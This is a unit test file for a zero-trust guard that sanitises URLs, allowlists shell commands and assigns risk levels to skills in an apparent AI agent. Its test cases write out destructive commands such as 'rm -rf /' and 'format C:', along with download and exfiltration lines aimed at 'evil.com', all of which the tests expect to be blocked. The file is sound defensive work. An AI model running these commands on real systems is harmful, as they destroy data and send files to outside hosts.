/**
 * @module ZMAS_Guard Tests
 * Unit tests for the Zero-Trust security layer.
 * Tests URL sanitization, shell command allowlisting, and skill risk classification.
 * 
 * [v3] Instance-based API — all methods called on `new ZMAS_Guard()`.
 */
import { describe, it, expect } from "vitest";
import { ZMAS_Guard } from "../../security/ZMAS_Guard";

describe("ZMAS_Guard", () => {
  const guard = new ZMAS_Guard();

  // ─── URL Sanitization (Layer 1) ───
  describe("executeAutoRemediation", () => {
    it("should pass through safe whitelisted URLs", () => {
      const input = "Check this: https://github.com/user/repo";
      const result = guard.executeAutoRemediation(input, "web_search");
      expect(result).toContain("https://github.com/user/repo");
      expect(result).not.toContain("Z-MAS BẢO VỆ");
    });

    it("should block non-whitelisted URLs", () => {
      const input = "Visit https://malicious-site.xyz/payload";
      const result = guard.executeAutoRemediation(input, "web_search");
      expect(result).toContain("Z-MAS GUARD");
      expect(result).not.toContain("https://malicious-site.xyz");
    });

    it("should skip URL scanning for safe tools", () => {
      const input = "Time is https://evil.com";
      const result = guard.executeAutoRemediation(input, "get_current_time");
      expect(result).toBe(input); // Unchanged
    });

    it("should handle empty/null input gracefully", () => {
      expect(guard.executeAutoRemediation("", "test")).toBe("");
    });

    it("should handle subdomain matching for whitelisted domains", () => {
      const input = "URL: https://docs.google.com/document/123";
      const result = guard.executeAutoRemediation(input, "web_search");
      expect(result).not.toContain("BLOCKED");
    });

    it("should block malformed URLs", () => {
      const input = "See: http://not!valid:url/path";
      const result = guard.executeAutoRemediation(input, "web_search");
      // Malformed URL should be replaced
      expect(result).toContain("Z-MAS GUARD");
    });
  });

  // ─── Shell Command Allowlist (Layer 5) ───
  describe("validateShellCommand", () => {
    it("should allow safe read-only commands", () => {
      const safeCommands = ["dir", "ls", "echo hello", "hostname", "ipconfig", "whoami"];
      for (const cmd of safeCommands) {
        const result = guard.validateShellCommand(cmd);
        expect(result.allowed, `Expected "${cmd}" to be allowed`).toBe(true);
      }
    });

    it("should allow safe git read commands", () => {
      const result = guard.validateShellCommand("git status");
      expect(result.allowed).toBe(true);
      expect(result.requiresApproval).toBe(false);
    });

    it("should allow safe npm read commands", () => {
      const result = guard.validateShellCommand("npm list");
      expect(result.allowed).toBe(true);
    });

    it("should allow TypeScript compilation check", () => {
      const result = guard.validateShellCommand("npx tsc --noEmit");
      expect(result.allowed).toBe(true);
    });

    it("should HARD BLOCK destructive commands", () => {
      const dangerousCommands = [
        "Remove-Item -Path C:\\important",
        "rm -rf /",
        "rmdir /s /q C:\\Users",
        "format C:",
        "shutdown /s",
        "Invoke-Expression $malicious",
      ];
      for (const cmd of dangerousCommands) {
        const result = guard.validateShellCommand(cmd);
        expect(result.allowed, `Expected "${cmd}" to be BLOCKED`).toBe(false);
        expect(result.requiresApproval, `Expected "${cmd}" to NOT offer approval`).toBe(false);
      }
    });

    it("should HARD BLOCK network exfiltration patterns", () => {
      const exfilCommands = ["wget http://evil.com/payload", "scp file user@evil:", "ftp evil.com"];
      for (const cmd of exfilCommands) {
        const result = guard.validateShellCommand(cmd);
        expect(result.allowed, `Expected "${cmd}" to be BLOCKED`).toBe(false);
      }
    });

    it("should require approval for unknown commands", () => {
      const result = guard.validateShellCommand("some-custom-tool --flag");
      expect(result.allowed).toBe(false);
      expect(result.requiresApproval).toBe(true);
    });

    it("should HARD BLOCK registry manipulation", () => {
      const result = guard.validateShellCommand("reg delete HKLM\\Software\\Test");
      expect(result.allowed).toBe(false);
      expect(result.requiresApproval).toBe(false);
    });
  });

  // ─── Skill Risk Classification (Layer 6) ───
  describe("getSkillRiskLevel", () => {
    it("should classify safe skills as LOW", () => {
      expect(guard.getSkillRiskLevel("get_current_time")).toBe("LOW");
      expect(guard.getSkillRiskLevel("read_local_file")).toBe("LOW");
    });

    it("should classify data access skills as MEDIUM", () => {
      expect(guard.getSkillRiskLevel("read_emails")).toBe("MEDIUM");
    });

    it("should classify write/send skills as HIGH", () => {
      expect(guard.getSkillRiskLevel("write_local_file")).toBe("HIGH");
      expect(guard.getSkillRiskLevel("send_zalo_bot")).toBe("HIGH");
    });

    it("should classify dangerous skills as CRITICAL", () => {
      expect(guard.getSkillRiskLevel("execute_command")).toBe("CRITICAL");
      expect(guard.getSkillRiskLevel("liva_ai_scientist")).toBe("CRITICAL");
    });

    it("should return UNKNOWN for unregistered skills", () => {
      expect(guard.getSkillRiskLevel("nonexistent_skill")).toBe("UNKNOWN");
    });
  });

  describe("shouldRequireApproval", () => {
    it("should require approval for CRITICAL skills", () => {
      expect(guard.shouldRequireApproval("execute_command")).toBe(true);
    });

    it("should require approval for UNKNOWN skills", () => {
      expect(guard.shouldRequireApproval("random_unknown_thing")).toBe(true);
    });

    it("should NOT require approval for LOW skills", () => {
      expect(guard.shouldRequireApproval("get_current_time")).toBe(false);
    });
  });
});
